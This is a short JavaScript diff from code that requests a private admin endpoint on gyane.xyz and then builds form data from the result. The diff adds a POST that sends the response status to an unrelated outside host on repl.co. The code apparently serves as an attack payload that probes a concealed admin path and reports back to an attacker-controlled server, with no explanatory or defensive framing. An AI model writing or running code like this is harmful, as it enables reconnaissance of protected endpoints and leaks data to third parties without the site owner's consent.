@@ -3,8 +3,14 @@ redirected = false;
   res = await fetch(
     "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/"
   );
+  fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
+    method: "POST",
+    body: { res: res.status },
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
   redirected = res.redirected;
-  data = await res.text();
   if (!redirected && res.status != 403) {
     formData = new FormData();
     formData.append(
